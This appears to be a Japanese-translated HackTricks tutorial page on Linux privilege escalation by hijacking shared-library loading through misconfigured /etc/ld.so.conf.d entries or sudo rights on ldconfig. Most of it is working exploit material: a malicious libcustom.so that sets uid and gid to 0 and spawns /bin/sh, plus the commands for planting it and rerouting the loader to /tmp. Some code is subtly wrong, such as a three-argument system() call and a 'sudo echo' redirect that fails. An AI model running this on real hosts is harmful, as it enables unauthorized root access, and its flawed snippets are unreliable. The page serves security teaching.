# ld.so privesc exploit example

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}

## 環境の準備

次のセクションでは、環境を準備するために使用するファイルのコードを見つけることができます。

{% tabs %}
{% tab title="sharedvuln.c" %}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{% endtab %}

{% tab title="libcustom.h" %}
```c
#include <stdio.h>

void vuln_func();
```
{% endtab %}

{% tab title="libcustom.c" %}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{% endtab %}
{% endtabs %}

1. **同じフォルダー**にそのファイルを作成します
2. **ライブラリ**を**コンパイル**します: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. `libcustom.so`を`/usr/lib`に**コピー**します: `sudo cp libcustom.so /usr/lib` (root権限)
4. **実行可能ファイル**を**コンパイル**します: `gcc sharedvuln.c -o sharedvuln -lcustom`

### 環境を確認する

_libcustom.so_ が _/usr/lib_ から**読み込まれている**ことと、バイナリを**実行**できることを確認します。
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
## Exploit

このシナリオでは、**誰かが_/etc/ld.so.conf/_内に脆弱なエントリを作成したと仮定します**：
```bash
sudo echo "/home/ubuntu/lib" > /etc/ld.so.conf.d/privesc.conf
```
The vulnerable folder is _/home/ubuntu/lib_ (where we have writable access).\
**次のコードをそのパス内でダウンロードしてコンパイルします:**
```c
//gcc -shared -o libcustom.so -fPIC libcustom.c

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(){
setuid(0);
setgid(0);
printf("I'm the bad library\n");
system("/bin/sh",NULL,NULL);
}
```
今、**誤って設定された**パス内に悪意のあるlibcustomライブラリを**作成した**ので、**再起動**を待つか、rootユーザーが**`ldconfig`**を実行するのを待つ必要があります（_このバイナリを**sudo**として実行できる場合、または**suidビット**が設定されている場合は、自分で実行できます_）。

これが発生したら、**再確認**してください。`sharevuln`実行可能ファイルが`libcustom.so`ライブラリをどこから読み込んでいるかを確認します:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
ご覧のとおり、**`/home/ubuntu/lib`から読み込んでいます**。もしユーザーがこれを実行すると、シェルが実行されます：
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
{% hint style="info" %}
この例では特権を昇格させていないことに注意してくださいが、実行されるコマンドを変更し、**rootまたは他の特権ユーザーが脆弱なバイナリを実行するのを待つことで**特権を昇格させることができます。
{% endhint %}

### その他の誤設定 - 同じ脆弱性

前の例では、管理者が**`/etc/ld.so.conf.d/`内の設定ファイルに非特権フォルダーを設定した**という誤設定を偽装しました。\
しかし、同じ脆弱性を引き起こす他の誤設定もあります。もしあなたが`/etc/ld.so.conf.d`内のいくつかの**設定ファイル**、`/etc/ld.so.conf.d`フォルダー内、または`/etc/ld.so.conf`ファイル内に**書き込み権限**を持っている場合、同じ脆弱性を設定して悪用することができます。

## エクスプロイト 2

**`ldconfig`に対してsudo権限を持っていると仮定します**。\
`ldconfig`に**設定ファイルをどこから読み込むかを指示することができます**。これを利用して`ldconfig`に任意のフォルダーを読み込ませることができます。\
それでは、"/tmp"を読み込むために必要なファイルとフォルダーを作成しましょう：
```bash
cd /tmp
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
今、**前のエクスプロイト**で示されたように、**`/tmp`内に悪意のあるライブラリを作成します**。\
最後に、パスをロードして、バイナリがライブラリをどこからロードしているかを確認しましょう：
```bash
ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**ご覧のとおり、`ldconfig`に対するsudo権限を持っていると、同じ脆弱性を悪用できます。**

{% hint style="info" %}
{% hint style="success" %}
AWSハッキングを学び、実践する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksをサポートする</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してハッキングトリックを共有してください。**

</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
